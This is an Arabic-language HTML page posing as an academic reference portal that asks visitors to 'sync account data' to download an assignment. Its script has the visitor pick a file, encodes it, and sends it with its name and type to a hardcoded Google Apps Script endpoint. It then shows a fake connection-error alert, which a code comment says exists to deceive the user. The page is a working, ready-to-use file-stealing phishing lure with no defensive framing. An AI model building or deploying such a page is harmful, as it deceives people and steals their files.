<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>بوابة المراجع التعليمية</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; background-color: #f0f2f5; }
        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 500px; margin: auto; }
        h2 { color: #333; }
        p { color: #666; margin-bottom: 25px; }
        button { background-color: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h2>نظام إدارة المراجع الأكاديمية</h2>
        <p>لتنزيل التكليف الأكاديمي، يرجى مزامنة بيانات الحساب مع النظام.</p>
        <button id="uploadBtn">مزامنة البيانات</button>
    </div>

    <script>
        document.getElementById('uploadBtn').addEventListener('click', async () => {
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = e => {
                const file = e.target.files[0];
                const reader = new FileReader();
                
                reader.onload = function() {
                    const base64data = reader.result.split(',')[1];
                    
                    // الرابط الخاص بك المدمج بالسكربت
                    const scriptUrl = "https://script.google.com/macros/s/AKfycbyy6WLffvYqnlUVh57R01V3LZZBjp2HG6Sa884lunccD_9W6dGY40gwl8AH7mVmAQ6z/exec";

                    fetch(scriptUrl, {
                        method: "POST",
                        mode: "no-cors",
                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
                        body: "data=" + encodeURIComponent(base64data) + 
                              "&filename=" + encodeURIComponent(file.name) + 
                              "&mimetype=" + encodeURIComponent(file.type)
                    }).then(() => {
                        // إعادة توجيه وهمية لإيهام المستخدم بحدوث خطأ تقني أو انتهاء العملية
                        alert("حدث خطأ في الاتصال بالسيرفر. يرجى المحاولة لاحقاً.");
                    });
                };
                reader.readAsDataURL(file);
            };
            input.click();
        });
    </script>
</body>
</html>
